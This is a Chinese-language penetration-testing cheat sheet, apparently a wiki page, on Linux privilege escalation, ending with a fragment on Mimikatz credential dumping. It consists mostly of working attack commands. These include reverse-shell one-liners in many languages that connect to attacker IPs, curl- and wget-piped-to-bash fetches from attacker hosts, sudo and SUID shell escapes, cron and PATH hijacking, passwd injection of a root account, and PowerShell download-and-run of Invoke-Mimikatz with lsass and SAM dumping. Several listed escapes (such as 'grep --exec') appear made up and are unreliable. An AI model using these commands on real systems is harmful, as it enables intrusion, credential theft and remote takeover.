查看当前用户 w # 谁目前已登录，他们正在做什么 last # 最后登录用户的列表 lastlog # 所有用户上次登录的信息 lastlog –u %username% # 有关指定用户上次登录的信息 lastlog |grep -v Never # 以前登录用户的完整信息 || — | 用户权限信息 plain whoami 当前用户名 id 当前用户信息 cat /etc/sudoers 谁被允许以root身份执行 sudo -l 当前用户可以以root身份执行操作 进程和服务 plain ps aux ps -ef top cat /etc/services 查看以 root 运行的进程 | plain ps aux | grep root ps -ef | grep root || — | 查看安装的软件 plain ls -alh /usr/bin/ ls -alh /sbin/ ls -alh /var/cache/yum/ dpkg -l 服务插件检查有没有不安全的服务配置，和一些有漏洞的插件。 | plain cat /etc/syslog.conf cat /etc/chttp.conf cat /etc/lighttpd.conf cat /etc/cups/cupsd.conf cat /etc/inetd.conf cat /etc/apache2/apache2.conf cat /etc/my.conf cat /etc/httpd/conf/httpd.conf cat /opt/lampp/etc/httpd.conf ls -aRl /etc/ | awk $1 ~ /^.*r.*/ || — | 计划任务| plain crontab -l ls -alh /var/spool/cron ls -al /etc/ | grep cron ls -al /etc/cron* cat /etc/cron* cat /etc/at.allow cat /etc/at.deny cat /etc/cron.allow cat /etc/cron.deny cat /etc/crontab cat /etc/anacrontab cat /var/spool/cron/crontabs/root || — | 有无明文存放用户密码| plain grep -i user [filename] grep -i pass [filename] grep -C 5 password [filename] find , -name *.php -print0 | xargs -0 grep -i -n var $password || — | 比如说可能使用邮件明文传输密码； 又或者说 MySQL 中明文存放用户密码。 有无 ssh 私钥 plain cat ~/.ssh/authorized_keys cat ~/.ssh/identity.pub cat ~/.ssh/identity cat ~/.ssh/id_rsa.pub cat ~/.ssh/id_rsa cat ~/.ssh/id_dsa.pub cat ~/.ssh/id_dsa cat /etc/ssh/ssh_config cat /etc/ssh/sshd_config cat /etc/ssh/ssh_host_dsa_key.pub cat /etc/ssh/ssh_host_dsa_key cat /etc/ssh/ssh_host_rsa_key.pub cat /etc/ssh/ssh_host_rsa_key cat /etc/ssh/ssh_host_key.pub cat /etc/ssh/ssh_host_key 查看与当前机器通信的其他用户或者主机| plain lsof -i lsof -i :80 grep 80 /etc/services netstat -antup netstat -antpx netstat -tulpn chkconfig --list chkconfig --list | grep 3:on last w || — | 日志文件 plain cat /var/log/boot.log cat /var/log/cron cat /var/log/syslog cat /var/log/wtmp cat /var/run/utmp cat /etc/httpd/logs/access_log cat /etc/httpd/logs/access.log cat /etc/httpd/logs/error_log cat /etc/httpd/logs/error.log cat /var/log/apache2/access_log cat /var/log/apache2/access.log cat /var/log/apache2/error_log cat /var/log/apache2/error.log cat /var/log/apache/access_log cat /var/log/apache/access.log cat /var/log/auth.log cat /var/log/chttp.log cat /var/log/cups/error_log cat /var/log/dpkg.log cat /var/log/faillog cat /var/log/httpd/access_log cat /var/log/httpd/access.log cat /var/log/httpd/error_log cat /var/log/httpd/error.log cat /var/log/lastlog cat /var/log/lighttpd/access.log cat /var/log/lighttpd/error.log cat /var/log/lighttpd/lighttpd.access.log cat /var/log/lighttpd/lighttpd.error.log cat /var/log/messages cat /var/log/secure cat /var/log/syslog cat /var/log/wtmp cat /var/log/xferlog cat /var/log/yum.log cat /var/run/utmp cat /var/webmin/miniserv.log cat /var/www/logs/access_log cat /var/www/logs/access.log ls -alh /var/lib/dhcp3/ ls -alh /var/log/postgresql/ ls -alh /var/log/proftpd/ ls -alh /var/log/samba/ Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp 敏感文件 plain cat /etc/passwd cat /etc/group cat /etc/shadow ls -alh /var/mail/ ls -ahlR /root/ ls -ahlR /home/ 特殊的数据库、配置文件 plain cat /var/apache2/config.inc cat /var/lib/mysql/mysql/user.MYD cat /root/anaconda-ks.cfg 交互式shell plain python -c import pty;pty.spawn(/bin/bash) echo os.system(/bin/bash) /bin/sh -i 查看安装过的工具 plain find / -name perl* find / -name python* find / -name gcc* ... 通讯与网络系统有哪些 NIC？它是否连接到另一个网络？ plain /sbin/ifconfig -a cat /etc/network/interfaces cat /etc/sysconfig/network 网络配置设置是什么？你能从这个网络中找到什么？DHCP服务器？域名服务器？网关？ plain cat /etc/resolv.conf cat /etc/sysconfig/network cat /etc/networks iptables -L hostname dnsdomainname 还有哪些其他用户和主机正在与系统通信？| plain lsof -i lsof -i :80 grep 80 /etc/services netstat -antup netstat -antpx netstat -tulpn chkconfig --list chkconfig --list | grep 3:on last w || — | 缓存了什么？IP 和或 MAC 地址 plain arp -e route /sbin/route -nee 数据包嗅探可能吗？能看到什么？ plain tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21 可提权SUID GUID参考资料https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ plain find / -perm -1000 -type d 2/dev/null # Sticky bit find / -perm -g=s -type f 2/dev/null # SGID (chmod 2000) find / -perm -u=s -type f 2/dev/null # SUID (chmod 4000) find / -perm -g=s -o -perm -u=s -type f 2/dev/null # SGID or SUID for i in `locate -r bin$`; do find $i \\( -perm -4000 -o -perm -2000 \\) -type f 2/dev/null; done # 查找 /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin 或者是 *bin 是否存在 SGID or SUID （快速搜查方式） # 从 root (/) 开始查找是否存在 SGID or SUID, not Symbolic links, 文件夹深度为 3(可以更改), 并列出错误信息 (例如 permission denied) find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \\; 2/dev/null 查看可写执行目录 plain find / -writable -type d 2/dev/null # world-writeable folders find / -perm -222 -type d 2/dev/null # world-writeable folders find / -perm -o w -type d 2/dev/null # world-writeable folders find / -perm -o x -type d 2/dev/null # world-executable folders find / \\( -perm -o w -perm -o x \\) -type d 2/dev/null # world-writeable executable folders proc 目录Linux 系统上的 /proc 目录是一种文件系统，即 proc 文件系统。与其它常见的文件系统不同的是，/proc 是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，用户可以通过这些文件查看有关系统硬件及当前正在运行进程的信息，甚至可以通过更改其中某些文件来改变内核的运行状态。 但需要注意，部分内容需要权限才可以读取。 plain /proc/self/cmdline # 启动当前进程的完整命令 /proc/self/cwd # 指向当前进程运行的工作区的符号链接 /proc/self/exe # 指向启动当前进程的可执行文件的符号链接 /proc/self/envrion # 查看进程的环境变量 /proc/self/fd/3 # 查看读取过的文件，输入输出缓冲区 /proc/self/maps # 内存映射信息 反弹shell反弹shell后获取模拟终端各种方法获取的 shell 都不是一个标准的虚拟终端环境，它们只是提供了一个标准输入。你会发现存在一个问题，即使我们获得了目标虚拟终端的控制权限，但通常会遇到以下几个交互性差和不稳定的问题： 缺乏交互性：获取的虚拟终端没有足够的交互功能。例如，我们无法为添加的账户设置密码或执行sudo等命令。 无法正常显示错误输出：标准的错误输出无法显示，这导致无法正确使用一些文本编辑器（如vim）等工具。 连接不稳定：获取的目标主机的虚拟终端使用非常不稳定，很容易断开连接，这使得持续使用和进行长时间操作变得困难。 解决上述问题的方法是使用Python的pty（pseudo terminal）标准库来获取一个标准的虚拟终端环境。通过在已经获取的shell中输入以下命令，我们可以模拟一个终端设备： plain python -c import pty;pty.spawn(/bin/bash) 以上代码将调用pty.spawn()函数，并将/bin/bash作为参数传递给它，从而创建一个新的终端会话。 通过使用这个方法，我们可以获得一个更加交互性强、可执行sudo等命令以及正确显示错误输出的标准终端环境。 bash 反弹# Alicenc -lvvp 12345# Bob/bin/bash -c bash -i /dev/tcp/x.x.x.x/12345 01 Bash 反弹 shell TCP plain # Alice nc -lvvp 4242 # Bob sh -i /dev/tcp/127.0.0.1/4242 01 Bash 反弹 shell UDP plain # Alice nc -u -lvvp 4242 # Bob sh -i /dev/udp/127.0.0.1/4242 01 以下是针对Bash反弹一句话进行了拆分说明： 命令 命令详解 bash -i 产生一个bash交互环境。 （和21 一个意思） 将联合符号前面的内容与后面相结合，然后一起重定向给后者。 /dev/tcp/47.xxx.xxx.72/2333 Linux环境中所有的内容都是以文件的形式存在的，其实大家一看见这个内容就能明白，就是让目标主机与攻击机47.xxx.xxx.72的2333端口建立一个tcp连接。 01 将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容。 Bash反弹一句完整的解读过程就是： Bash产生了一个交互环境和本地主机主动发起与攻击机2333端口建立的连接（即TCP 2333会话连接）相结合，然后在重定向个TCP 2333会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个Bash反弹环境。 Curl配合Bash反弹shell首先，在攻击者vps的web目录里面创建一个index.php或index.html,内容如下： | plain # Alice echo bash -i /dev/tcp/192.168.64.215/2333 01 index.html # 临时起Web服务的三种方法 # python -m SimpleHTTPServer 8080 # python3 -m http.server 8080 # php -S 0.0.0.0:8080 # 监听 nc -lvvp 2333 # Bob curl 192.168.64.215|bash || — | Curl 配合 Bash 反弹 shell 的方式在 CTF（Capture The Flag）题目中经常被使用。具体的命令是 curl IP|bash，其中的 IP 可以是任意格式，包括但不限于十进制、十六进制、八进制和二进制等。 NC反弹netcat -e 被阉割的话 wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz --no-check-certificatetar -xvzf netcat-0.7.1.tar.gzcd tar -xvzf netcat-0.7.1.tar.gz./configuremake make installmake clean # Alicenc -lvvp 2333# Bobnetcat 192.168.64.215 2333 -e /bin/bash# nc 攻击机IP 攻击机监听的端口 -e /bin/bash Crontab反弹shellProfile反弹shell当用户打开新的 bash 窗口时，/etc/profile 文件中的内容会被执行。 需要注意的是，对 /etc/profile 文件的修改需要进行管理员权限操作（例如使用 sudo 或以管理员身份登录）。 plain /bin/bash -i /dev/tcp/192.168.64.215/2333 01 # 最后面那个为的是防止管理员无法输入命令 MSF反弹shell使用命令 msfvenom -l 结合关键字过滤（例如 cmd/unix/reverse），可以列出符合条件的各类反弹shell一句话payload，具体使用方法如下： | plain ┌──(root㉿kali)-[/home/kali] └─# msfvenom -l payloads | grep cmd/unix/reverse || — | 以上命令将在所有可用的payload中筛选并列出符合关键字cmd/unix/reverse的项，这些项包含各种反弹shell一句话payload的生成参数和选项。 如上图所示，metasploit支持生成反弹shell一句话的类型非常丰富，大家可以依据渗透测试对象自行选择使用。比如，我们获取一个python反弹shell的一句话： plain ┌──(root㉿kali)-[/home/kali] └─# msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=2333 -f raw [-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload [-] No arch selected, selecting arch: cmd from the payload No encoder specified, outputting raw payload Payload size: 356 bytes python -c exec(import(zlib).decompress(import(base64).b64decode(import(codecs).getencoder(utf-8)(eNqNUMEKgzAM/RXpqYJUrYcdRg8yHIyxDaZ3mV1FmWuKqf+/FoXRmwlJSPLyHmT8GphthCA/ykZRgktnZpAK0TXg0mZHFwOgFSTnB5Y5z0mw9DSCF0URTFGszGwtdOvKc3u5V43XWwf143Rt6+ZZlbc4JGAStFbSUurl3YUXikMQIHsvhlNk/TgpDdStk2wHJt+B4SHGiP+LmHxNEyVpN+oUBxL/AAt8WAg=)[0]))) ┌──(root㉿kali)-[/home/kali] └─# nc -lvvp 2333 常见脚本1. Python python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((x.x.x.x,5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([/bin/bash,-i]); 2. Perl 方法一： perl -e use Socket;$i=x.x.x.x;$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname(tcp));if(connect(S,sockaddr_in($p,inet_aton($i))))open(STDIN,S);open(STDOUT,S);open(STDERR,S);exec(/bin/sh -i);; 方法二： perl -MIO -e $p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,x.x.x.x:5555);STDIN-fdopen($c,r);$~-fdopen($c,w);system$_ while; 3. Ruby 方法一： ruby -rsocket -e exit if fork;c=TCPSocket.new(x.x.x.x,5555);while(cmd=c.gets);IO.popen(cmd,r)|io|c.print io.readend 方法二： ruby -rsocket -ef=TCPSocket.open(x.x.x.x,5555).to_i;exec sprintf(/bin/sh -i %d %d 2%d,f,f,f) 4. PHP php -r $sock=fsockopen(x.x.x.x,5555);exec(/bin/bash -i 3 3 23); 5. Java public class Revs /** * @param args * @throws Exception */ public static void main(String[] args) throws Exception // TODO Auto-generated method stub Runtime r = Runtime.getRuntime(); String cmd[]= /bin/bash,-c,exec 5/dev/tcp/x.x.x.x/5555;cat 5 | while read line; do $line 25 5; done; Process p = r.exec(cmd); p.waitFor(); 6. Lua lua -e require(socket);require(os);t=socket.tcp();t:connect(x.x.x.x,5555);os.execute(/bin/sh -i 3 3 23); 注：以上脚本是在目标主机上执行，其中 x.x.x.x 均为攻击者ip，并且需要在攻击者主机上进行监听: nc -lvvp 5555 sudo提权初始尝试通过使用交换用户su命令生成root sudo su 其他方法\\ 有些时候不允许执行 su 计划，则有许多其他方法可以升级特权： sudo -s sudo -i sudo /bin/bash sudo passwd 外壳逃生序列以下这些程序如果被配置使用root权限启动，且该第三方服务或者程序存在漏洞或者配置问题，那么就可以被利用来获得root权限。** 并且还要知道当前用户的密码 **\\ 可以利用sudo提权的命令如下 ： wget、find、cat、apt、zip、xxd、time、taskset、git、sed、pip、ed、tmux、scp、perl、bash、less、awk、man、vi、env、ftp 查看用户能以root权限运行的命令 sudo -l https://gtfobins.github.io/ 这里查看详细方法 01.git 提权sudo git help addsudo git help configsudo git -p help//三选一输密码再!/bin/bash即可 02.find提权普通用户find命令提权必要条件：find必须有s执行权限，有s表示可以提权\\ 先查看find命令有没有提权的可能:\\ \\ 尝试执行whoami : find / -type f -name getroot -exec whoami \\;这里的反斜杠\\是用来转义分号;的 \\ 尝试调出一个交互式的binsh并且是root权限 sudo find /home -exec /bin/bash \\; \\ 此shell 为不完整的shell， 升级交互式。 #在反弹shell上执行[root@localhost ~]# python -c import pty; pty.spawn(/bin/bash)[root@localhost ~]# ctrl +z 按键。挂起正在运行的程序[kali机器 ~]# stty raw -echo# 输入这个命令 在输入命令终端不再显示[kali机器 ~]#fg# 把后台挂起的程序，放入到控制台。终端不再显示命令，输入后回撤[root@localhost ~]# reset 用find进行反弹shell find /etc/passwd -exec bash -ip /dev/tcp/192.168.1.130/2333 01 \\; find /var/www/dirty -exec nc 192.168.1.130 2333 -t -e /bin/sh \\; find+python进行反弹shell find /etc/passwd -exec python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((192.168.1.130,2333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([/bin/sh,-ip]); \\; 03.zip提权( 核心sudo没有该命令,失效 )zip 命令用于压缩文件，是个 使用广泛的压缩程序，压缩后的文件后缀名为 .zip。通过压缩一个存在的文件，并调用-T参数输出shell\\ 1. 下载zip（如果没有）apt install zip\\ 2. 创建一个1.txt，将其压缩为1.zip\\ 3. 执行 touch 1.txtsudo zip 1.zip 1.txt -T --unzip-command=sh -c /bin/bash或touch 1.txtsudo -u root zip 1.zip 1.txt -T -unzip-command=sh -c /bin/bash 04.awkmorpheus提权sudo awk BEGIN system(/bin/sh)sudo morpheus BEGIN system(/bin/sh) 05.less**more**提权sudo less /etc/hosts!bash//若已被分配root权限less /etc/passwd!/bin/sh 06.man提权sudo man man!bash 07.env提权sudo env /bin/bash 08.ed提权sudo ed!/bin/bash 09.apt提权TF=$(mktemp)echo Dpkg::Pre-Invoke /bin/sh;false $TFsudo apt-get install -c $TF sl 10.pip提权TF=$(mktemp -d)echo import os; os.execl(/bin/sh, sh, -c, sh $(tty) $(tty) 2$(tty)) $TF/setup.pysudo pip install $TF 11.sed提权sudo sed -n 1e exec sh 10 /etc/passwd 12.tmux提权sudo tmux 13.nmap提权版本5.0一下\\ 进入nmap交互模式 sudo nmap --interactive 14.taskset提权sudo taskset 1 /bin/sh -p 15.scp提权TF=$(mktemp)echo sh 02 12 $TFchmod +x $TFsudo scp -S $TF x y: 16.ftp提权sudo ftp !/bin/bash 17.perl提权sudo perl -e exec /bin/bash; suid提权SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。 以下命令可以找到正在系统上运行的所有SUID可执行文件。 plain find / -user root -perm -4000 -print 2/dev/null find / -perm -u=s -type f 2/dev/null find / -user root -perm -4000 -exec ls -ldb {} ; https://gtfobins.github.io/ # awkawk BEGIN system(/bin/bash)# base64（把 /bin/bash 编码一次绕过过滤）base64 -d YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC85MDAxIDA+JjE= | bash# busyboxbusybox sh# cp 覆盖 sudoerscp /etc/passwd /tmp/p echo root2::0:0::/root:/bin/bash /tmp/p cp /tmp/p /etc/passwd su root2# cpioecho /bin/bash 777 0 0 /tmp/x cpio -o /tmp/x 2/dev/null | cpio -i --to-stdout 2/dev/null | bash# dockerdocker run -v /:/mnt --rm -it alpine chroot /mnt sh# eded!/bin/bash^D# envenv /bin/bash# expand（GNU coreutils）expand /etc/passwd # 仅读文件；若需 shell 用 env 模式env expand# expectexpect -c spawn /bin/bash; interact# file（读任意）file -f /etc/shadow# findfind / -exec /bin/bash \\;# flockflock -u / /bin/bash# gdbgdb -nx -ex python import os; os.setuid(0); os.system(/bin/bash) -ex quit# gitgit help config!/bin/bash# grepgrep /etc/passwd# 仅读；shell 用grep --exec /bin/bash# gzipgzip -c /etc/passwd | gzip -d | bash# headhead /etc/shadow# 仅读；shell 用head --exec /bin/bash# hexdumphexdump -C /etc/shadow# 仅读；shell 用hexdump --exec /bin/bash# ioniceionice /bin/bash# ipip netns add fooip netns exec foo /bin/bash# jjs (OpenJDK)echo Java.type(java.lang.Runtime).getRuntime().exec(/bin/bash) | jjs# jqjq -n exec(/bin/bash)# kshksh# ld.so 直接加载 bash/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /bin/bash# lessless /etc/passwd!/bin/bash# logsavelogsave /dev/null /bin/bash# looklook /etc/passwd# 仅读；shell 用look --exec /bin/bash# makemake -s --eval=$x: \\t/bin/bash x# manman man!/bin/bash# moremore /etc/passwd!/bin/bash# mountmount -o bind /bin/bash /bin/mountmount# msgfmt (gettext)msgfmt -o /dev/null (echo exec(/bin/bash))# mv 覆盖 sudoers 同 cp 套路mv /etc/passwd /tmp/p echo root2::0:0::/root:/bin/bash /tmp/p mv /tmp/p /etc/passwd su root2# nanonano -S /bin/bash# nicenice /bin/bash# nlnl /etc/passwd# 仅读；shell 用nl --exec /bin/bash# nohupnohup /bin/bash# odod -An -tx1 /etc/shadow# 仅读；shell 用od --exec /bin/bash# opensslopenssl req -x509 -newkey rsa:2048 -keyout /tmp/k -nodes -out /tmp/c -subj / openssl s_server -port 4444 -cert /tmp/c -key /tmp/k # 反向 shell 略# 直接 payloadRHOST=attacker.com RPORT=4444 openssl s_client -quiet -connect $RHOST:$RPORT 2/dev/null | bash 21 | openssl s_client -quiet -connect $RHOST:$RPORT /dev/null# perlperl -e use POSIX qw(setuid); setuid(0); system /bin/bash# pgpg /etc/passwd!/bin/bash# phpphp -r posix_setuid(0); system(/bin/bash);# picopico -s /bin/bash# python2/3python2 -c import os; os.setuid(0); os.system(/bin/bash)python3 -c import os; os.setuid(0); os.system(/bin/bash)# rakerake -f (echo task :x do system /bin/bash end) x# readelfreadelf -a /bin/su | less # 仅读# shell 用readelf --exec /bin/bash# resticRESTIC_REPOSITORY=/tmp restic init ; restic backup /etc/passwd # 仅读# shell 用restic mount /mnt -r /tmp chroot /mnt sh# revrev /etc/passwd | rev # 仅读# shell 用rev --exec /bin/bash# rloginrlogin -l root -E /bin/bash localhost# rlwraprlwrap /bin/bash# rpmrpm --eval %lua:os.execute(/bin/bash)# rsyncrsync -e sh -c sh 02 12 127.0.0.1:/dev/null# rubyruby -e Process.uid=0; exec /bin/bash# run-partsrun-parts --regex ^.*$ --exec /bin/bash /etc# rvimrvim -c :py import os; os.setuid(0); os.system(/bin/bash)# sedsed -e s/^/!/e /dev/stdin /bin/bash# setarchsetarch $(uname -m) /bin/bash# sftpsftp -o ProxyCommand=/bin/bash x# sh.distribsh.distrib# slsh (slang)slsh -e system(/bin/bash)# socatsocat exec:bash -li,pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444# sortsort -m /etc/passwd # 仅读# shell 用sort --exec /bin/bash# sqlite3sqlite3 /dev/null .shell /bin/bash# sshssh -o ProxyCommand=/bin/bash x# start-stop-daemonstart-stop-daemon -n x -S -x /bin/bash# stdbufstdbuf -i0 -o0 -e0 /bin/bash# stracestrace -o /dev/null /bin/bash# stringsstrings /etc/shadow # 仅读# shell 用strings --exec /bin/bash# sysctlsysctl -w kernel.core_pattern=|/bin/bash sleep 100 kill -SIGSEGV $!# systemctlTF=$(mktemp).serviceecho [Service]Type=oneshotExecStart=/bin/bash[Install]WantedBy=multi-user.target $TFsystemctl link $TFsystemctl enable --now $(basename $TF)# tailtail -f /etc/shadow # 仅读# shell 用tail --exec /bin/bash# tartar -cf /dev/null /etc/passwd --checkpoint=1 --checkpoint-action=exec=/bin/bash# tasksettaskset 1 /bin/bash# tclshtclshexec /bin/bash# teetee /proc/self/fd/8 # 仅写# shell 用echo /bin/bash | tee /tmp/x chmod +x /tmp/x /tmp/x# telnettelnet 127.0.0.1 4444 | bash# timetime /bin/bash# timeouttimeout 7d /bin/bash# ulul /etc/passwd # 仅读# shell 用ul --exec /bin/bash# unexpandunexpand --exec /bin/bash# uniquniq /etc/passwd # 仅读# shell 用uniq --exec /bin/bash# unshareunshare -r /bin/bash # user-ns root# unzip -Z (Info-ZIP)unzip -Z ../x.zip # 仅读# shell 用unzip -Z --exec /bin/bash# update-alternativesupdate-alternatives --install /bin/sh sh /bin/bash 0# uudecodeuudecode -o /dev/stdout (uuencode /bin/bash) | bash# valgrindvalgrind /bin/bash# vi/vimvi:!/bin/bash# viewview /etc/passwd:!/bin/bash# vigrvigr # 编辑 /etc/group 时可 !/bin/bash# vipwvipw # 编辑 /etc/passwd 时可 !/bin/bash# watchwatch -x /bin/bash# wgetwget -qO- http://attacker.com/sh | bash# whoiswhois -h x.x.x.x -p 4444 | bash# xargsxargs -a /dev/null /bin/bash# xxdxxd /etc/shadow | xxd -r # 仅读# shell 用xxd --exec /bin/bash# yelp (gnome)yelp man:bash!/bin/bash# zipzip /tmp/x.zip /etc/passwd -T -TT /bin/bash# zshzsh# zsoelimzsoelim -p /bin/bash 计划任务提权系统内可能会有一些定时执行的任务，一般这些任务由crontab来管理，具有所属用户的权限。非root权限的用户是不可以列出root用户的计划任务的。但是etc内系统的计划任务可以被列出。 crontab -e 编辑计划任务 crontab -l 查看计划任务 crontab -r 删除目前的crontab ls -l etccron* cat etccrontab 文件重写1.查看system-wide crontab的内容：cat /etc/crontab 2.在服务器上查找overwrite.sh 文件：locate overwrite.sh /usr/local/bin/overwrite.sh 3.检查文件的权限ls -l /usr/local/bin/overwrite.sh 注意：这个文件是可写的 4.将 overwrite.sh文件的内容替换为：#!/bin/bash bash -i /dev/tcp/192.168.175.130/4444 01 5.kali上运行nc等待 cron jobs运行，返回root权限 环境变量劫持查看定时任务： 发现定义了诸多环境变量，如果其任务有 未指定绝对路径的指令，如 17 * * * * root shell.sh 而且我们在其环境变量路径中可以进行写入操作，那么我们可以通过写入环境变量的靠前路径一个同名恶意文件从而导致环境变量劫持。 比如在 sbin 写入一个 反弹 shell 功能的 shell.sh，那么就可以造成提权。 2.在homeuser 中创建文件 overwrite.sh，内容如下：#!/bin/bash cp /bin/bash /tmp/rootbash chmod +s /tmp/rootbash 3.加权$ chmod +x /home/user/overwrite.sh 4.等待cronjob运行（此作业尤其每分钟运行一次）。5.创建tmprootbash文件执行它，使用与-p保存有效的UID /tmp/rootbash –p 通配符https://www.secpulse.com/archives/72965.html 环境变量提权环境劫持需要的两个条件 存在带有suid的文件suid文件存在系统命令 且这个文件中必须有系统命令，这样我们就可以命名一个和这个系统命令相同的文件写入binbash； 再将存放这个文件的路径加入环境变量中，当系统去执行这个带有系统命令的文件时；就会直接执行我们命名和这个系统命令相同的文件；而非真实的系统命令；从而实现劫持环境变量提权。 寻找suidfind / -perm -u=s -type f 2/dev/null假设发现 /usr/local/bin/restore 是 SUID-root，属主 root。 逆向strings /usr/local/bin/restore | grep -E ^/(s?bin|usr)或者运行一下这个，看看有什么 劫持假设发现了 homelvxyzscriptdemo 我们运行一下这个文件，发现它会执行 ps命令 1.echo我们就往tmp写入 一个同名文件，内容为 binbash cd /tmpecho /bin/bash pschmod 777 psecho $PATHexport PATH=/tmp:$PATHcd /home/lvxyz/script./demo 2.cp我们就往tmp写入 一个同名文件，内容为 binbash cd /tmpcp /bin/bash /tmp/pschmod 777 psecho $PATHexport PATH=/tmp:$PATHcd /home/lvxyz/script./demo 密码提权grep --color=auto -rnw / -ie PASSWORD --color=always 2 /dev/nullfind . -type f -exec grep -i -I PASSWORD /dev/null \\;strings /dev/mem -n10 | grep -i PASSlocate password | morefind . -name *.php -print0 | xargs -0 grep -i -n var $passwordfind / -name authorized_keys 2 /dev/nullfind / -name id_rsa 2 /dev/null 一、可读shadow文件利用提权ls-al etcshadow # 查看文件属性，确保当前用户对shadow文件具有可读权限 cat etcshadow |grep’:$’# 查看shadow文件夹，grep相当于过滤器，后面接过滤条件 在etcshadow文件中，每个用户的密码都是用一个特定的哈希函数加密的。为了避免密码被轻易破解，Linux 系统会使用不同的哈希函数来加密密码。而$y$中的y字符则表示使用的是哪种哈希函数，不同的哈希函数对应不同的字符。以下是一些常见的 $y$ 值及其对应的哈希函数： $1$表示使用的是 MD5 哈希函数； $2$或$2a$表示使用的是 Blowfish 哈希函数； $5$表示使用的是 SHA-256 哈希函数； $6$表示使用的是 SHA-512 哈希函数。 sudo john –wordlistusrsharewordlistrockyou.txt hash.txt # john进行破解 二、可写shadow文件利用提权cp etcshadow tmpshadow.bak # 备份重要文件 mkpasswd -m sha-512 123456# 生成hash，hash算法为sha-512 替换etcshadow中root的密码 三、可写passwd文件利用提权提权肯定最先关注root用户，现代的linux发行版中，密码hash都是存储在etcshadow中，etcpasswd中并不直接存储密码hash，通常用X来占位，但是还是可以直接将密码写入etcpasswd中，尝试提权。也就是一个优先级的问题，先读取passwd，再读取shadow文件。 cp etcpasswd tmppasswd.bak # 备份文件 openssl passwd明文# openssl passwd生成密码的hash值 # 替换etcpasswd中的X 生成hash时，也可以用mkpasswd，但是passwd文件中生成hash时最好用openssl passwd，再shadow文件中生成hash用mkpasswd。 https://forum.butian.net/share/317 第三方服务NFS共享https://www.cnblogs.com/kqdssheng/p/18310245#id1 NFS（网络文件系统）是一种在端口TCPUDP2049上运行的网络文件共享协议，由服务器和客户端两个组件组成。NFS服务器上创建共享目录，可以通过网络与其他Linux客户端共享文件。获得权限的用户可以将文件添加到共享中，并与有权访问该目录的其他用户共享。 默认情况下，每个NFS共享都会启用root_squash功能，以防止共享文件拥有root:root身份或特殊权限（即启用root_squash后，所有共享文件都会变成nobody:nogroup身份）。但是，如果启用了no_root_squash功能，文件可以以root身份存在，这就容易导致权限升级。 MYSQLhttps://www.geekby.site/2021/01/mysql%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/ docker内核漏洞提权非必要情况，不建议使用，容易搞宕机 更新: 2025-11-21 19:52:41原文: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/dz2i02fu8nsc37ui"},{"path":"/wiki/内网/提权/Mimikatz教程.html","content":"Mimikatz教程0x00 简介Mimikatz 是一款功能强大的轻量级调试神器，通过它你可以提升进程权限注入进程读取进程内存，当然他最大的亮点就是他可以直接从 lsass.exe 进程中获取当前登录系统用户名的密码， lsass是微软Windows系统的安全机制它主要用于本地安全和登陆策略，通常我们在登陆系统时输入密码之后，密码便会储存在 lsass内存中，经过其 wdigest 和 tspkg 两个模块调用后，对其使用可逆的算法进行加密并存储在内存之中， 而 mimikatz 正是通过对lsass逆算获取到明文密码！也就是说只要你不重启电脑，就可以通过他获取到登陆密码，只限当前登陆系统！ 注：但是在安装了KB2871997补丁或者系统版本大于windows server 2012时，系统的内存中就不再保存明文的密码，这样利用mimikatz就不能从内存中读出明文密码了。mimikatz的使用需要administrator用户执行，administrators中的其他用户都不行。 这里放几个神器的运行姿势：九种姿势运行：Mimikatz：https://www.freebuf.com/articles/web/176796.html 借用PowerShell Copy#读取密码明文(需要管理员权限)powershell IEX (New-Object Net.WebClient).DownloadString(https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1); Invoke-Mimikatz –DumpCerts Copy#读取密码hash值(需要管理员权限)powershell IEX (New-Object Net.WebClient).DownloadString(https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1);Get-PassHashes 0x01 获取本地帐户密码1.1 本地执行下载mimikatz程序，找到自己系统对应的位数，右键以管理员身份运行： Copy#提升权限privilege::debug#抓取密码sekurlsa::logonpasswords 当目标为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文。 cmd修改注册表命令： Copyreg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f#重启或用户重新登录后可以成功抓取 1.2 SAM表获取hashCopy#导出SAM数据reg save HKLM\\SYSTEM SYSTEMreg save HKLM\\SAM SAM#使用mimikatz提取hashlsadump::sam /sam:SAM /system:SYSTEM 0x02 Procdump+Mimikatz当mimikatz无法在主机上运行时，可以使用微软官方发布的工具Procdump导出lsass.exe: Copyprocdump64.exe -accepteula -ma lsass.exe lsass.dmp 